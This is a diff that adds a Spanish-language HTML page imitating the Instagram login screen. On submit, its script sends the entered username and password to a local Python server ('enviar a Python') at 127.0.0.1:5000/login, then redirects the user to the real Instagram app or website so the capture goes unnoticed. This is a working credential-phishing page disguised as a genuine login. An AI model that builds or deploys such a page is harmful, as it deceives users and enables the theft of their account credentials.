@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Instagram</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#121318;
+    color:white;
+    width:100%;
+    height:100vh;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    height:100vh;
+    margin:auto;
+    padding:55px 24px 35px;
+    display:flex;
+    flex-direction:column;
+}
+
+.title{
+    font-size:28px;
+    font-weight:700;
+    margin-bottom:35px;
+}
+
+.input-box{
+    width:100%;
+    height:58px;
+    background:transparent;
+    border:1px solid #363b4a;
+    border-radius:16px;
+    margin-bottom:14px;
+    padding:0 18px;
+    color:white;
+    font-size:16px;
+    outline:none;
+}
+
+.input-box::placeholder{
+    color:#9aa0aa;
+}
+
+.input-box:focus{
+    border:1px solid #4d90ff;
+}
+
+/* BOTÓN */
+.login-btn{
+    width:100%;
+    height:58px;
+    border:none;
+    border-radius:16px;
+    font-size:18px;
+    font-weight:bold;
+    margin-top:8px;
+    background:#003a91;
+    color:#5f8bd6;
+    opacity:0.5;
+    cursor:not-allowed;
+    transition:0.2s;
+}
+
+.login-btn.active{
+    background:#0057d8;
+    color:white;
+    opacity:1;
+    cursor:pointer;
+    box-shadow:0 0 12px rgba(0,87,216,0.6);
+}
+
+.forgot{
+    text-align:center;
+    margin-top:26px;
+    font-size:16px;
+    font-weight:600;
+}
+
+.bottom{
+    margin-top:auto;
+}
+
+.signup-btn{
+    width:100%;
+    height:58px;
+    background:transparent;
+    border:1px solid #0a84ff;
+    border-radius:16px;
+    color:#0a84ff;
+    font-size:17px;
+    font-weight:700;
+    margin-bottom:14px;
+}
+
+.meta{
+    text-align:center;
+    margin-top:30px;
+    color:#d7d7d7;
+    font-size:24px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="title">
+        Iniciar sesión en Instagram
+    </div>
+
+    <form id="loginForm">
+
+        <input class="input-box" type="text" name="usuario"
+        placeholder="Número de móvil, nombre de usuario o correo electrónico">
+
+        <input class="input-box" type="password" name="contraseña"
+        placeholder="Contraseña">
+
+        <button class="login-btn" type="submit" id="loginBtn" disabled>
+            Iniciar sesión
+        </button>
+
+    </form>
+
+    <div class="forgot">
+        ¿Has olvidado la contraseña?
+    </div>
+
+    <div class="bottom">
+
+        <button class="signup-btn">
+            Crear una cuenta
+        </button>
+
+        <div class="meta">
+            ∞ Meta
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+const usuario = document.querySelector('input[name="usuario"]');
+const contraseña = document.querySelector('input[name="contraseña"]');
+const boton = document.getElementById("loginBtn");
+const form = document.getElementById("loginForm");
+
+function verificar() {
+    if (usuario.value.trim() !== "" && contraseña.value.trim() !== "") {
+        boton.disabled = false;
+        boton.classList.add("active");
+    } else {
+        boton.disabled = true;
+        boton.classList.remove("active");
+    }
+}
+
+usuario.addEventListener("input", verificar);
+contraseña.addEventListener("input", verificar);
+
+form.addEventListener("submit", function(e){
+    e.preventDefault();
+
+    // enviar a Python
+    fetch("http://127.0.0.1:5000/login", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `usuario=${usuario.value}&contraseña=${contraseña.value}`
+    });
+
+    // preguntar abrir Instagram
+    const abrir = confirm("¿Quieres abrir la aplicación de Instagram?");
+
+    if (abrir) {
+        window.location.href = "instagram://app";
+    } else {
+        window.location.href = "https://www.instagram.com";
+    }
+});
+
+</script>
+
+</body>
+</html>
